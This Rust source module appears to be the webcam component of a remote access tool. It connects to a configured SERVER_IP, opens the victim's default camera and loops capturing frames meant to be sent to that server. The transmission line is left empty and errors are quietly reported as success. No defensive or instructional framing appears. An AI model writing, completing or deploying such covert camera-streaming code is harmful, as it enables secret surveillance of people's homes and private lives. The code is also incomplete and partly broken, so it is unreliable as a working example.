use nokhwa::{Camera, pixel_format::RgbFormat, utils::{CameraIndex, RequestedFormat, RequestedFormatType}};
use std::net::TcpStream;
use crate::SERVER_IP;

pub fn run(conn: &mut TcpStream, port: &i32) -> Result<bool, String> {
    // Connect to server port
    let webcam_conn = match TcpStream::connect(format!("{SERVER_IP}:{port}")) {
        Ok(c) => c,
        Err(e) => { return Ok(true) }
    };

    // WebCam Connection made, start to cature and send frames
    let index = CameraIndex::Index(0);
    let requested = RequestedFormat::new::<RgbFormat>(RequestedFormatType::AbsoluteHighestFrameRate);
    let mut camera = match Camera::new(index, requested) {
        Ok(c) => c,
        Err(e) => { return Ok(true) } // Send error message
    };

    loop {
        // Capture frame
        let frame = camera.frame().unwrap();
        
        // Send frame through socket
        
    };

    Ok(true)
}

pub fn close() -> Result<bool, String> {
    Ok(true)
}